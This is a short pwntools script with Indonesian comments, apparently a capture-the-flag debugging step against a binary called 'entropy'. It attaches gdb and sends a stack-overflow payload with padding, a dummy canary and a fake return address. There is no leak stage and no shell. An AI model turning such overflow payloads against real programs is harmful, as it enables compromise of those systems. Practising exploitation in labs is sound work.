from pwn import *

context.binary = elf = ELF('./entropy')
libc = ELF('./libc6_2.42-0ubuntu3_amd64.so') # Pakai libc remote untuk tes lokal

p = process('./entropy')

# Kita bypass leak dengan asumsi Canary dan Libc Base sudah diketahui
# (Kita set dummy value dulu untuk melihat crash-nya)
# Breakpoint di instruksi ret (main+233)
gdb.attach(p, gdbscript='b *main+233\nc')

# Kirim payload yang membuat ret tereksekusi (Canary dummy)
payload = b'A' * 72
payload += p64(0xdeadbeefcafebabe) # Canary dummy (akan memicu smash, tapi kita mau lihat ret)
payload += b'B' * 8
payload += p64(0)
payload += p64(0)
payload += p64(0x4141414141414141) # Fake return address

p.sendline(payload)
p.interactive()